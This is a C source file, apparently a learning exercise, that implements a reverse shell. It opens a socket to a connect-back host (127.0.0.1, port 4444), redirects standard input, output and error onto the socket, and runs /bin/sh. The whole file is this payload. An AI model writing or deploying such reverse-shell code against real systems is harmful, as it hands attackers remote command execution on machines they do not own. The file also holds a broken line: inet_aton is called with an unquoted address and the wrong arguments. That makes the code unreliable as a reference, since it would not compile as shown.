#include <stdio.h>
#include <string.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <unistd.h>


int main() {

  int fd;   // file descriptor for socket() output
  fd = socket(AF_INET, SOCK_STREAM, 0);

  // define structure for connect-back machine: 'home' in this case
  struct sockaddr_in home;

  // Initialize struct parameters for 'home'
  home.sin_family = AF_INET;
  home.sin_port = htons(4444);
  home.sin_addr = inet_aton(127.0.0.1);
  memset(&(home.sin_zero), '\0', 8);

  // duplicate socket() file descriptor to stdin, stdout, stderr
  dup2(fd, 0);
  dup2(fd, 1);
  dup2(fd, 2);

  // Connect to 'home' via file descriptor, fd
  int home_size = sizeof(home);
  connect(fd, (struct sockaddr *)&home, home_size);

  // Execute shell
  execve("//bin/sh", (char *[]){"//bin/sh", NULL}, NULL);

}
